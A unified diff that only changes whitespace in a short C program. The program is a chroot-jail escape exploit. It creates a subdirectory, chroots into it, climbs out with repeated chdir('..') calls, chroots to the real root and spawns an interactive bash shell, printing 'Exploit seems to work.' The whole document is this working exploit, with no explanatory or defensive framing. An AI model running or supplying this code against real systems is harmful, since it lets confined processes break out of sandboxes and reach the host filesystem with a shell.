@@ -13,28 +13,28 @@ void die(char *msg) {
 int main(int argc, char *argv[])
 {
 	int i;
-	
+
 	if (chdir("/") != 0)
 		die("chdir(/)");
-	
+
 	if (mkdir("baz", 0777) != 0)
 		; //die("mkdir(baz)");
-	
+
 	if (chroot("baz") != 0)
 		die("chroot(baz)");
-	
+
 	for (i=0; i<50; i++) {
 		if (chdir("..") != 0)
 			die("chdir(..)");
 	}
-	
+
 	if (chroot(".") != 0)
 		die("chroot(.)");
-	
+
 	printf("Exploit seems to work. =)\n");
-	
+
 	execl("/bin/bash", "bash", "-i", (char *)0);
 	die("exec bash");
-	
+
 	exit(0);
 }
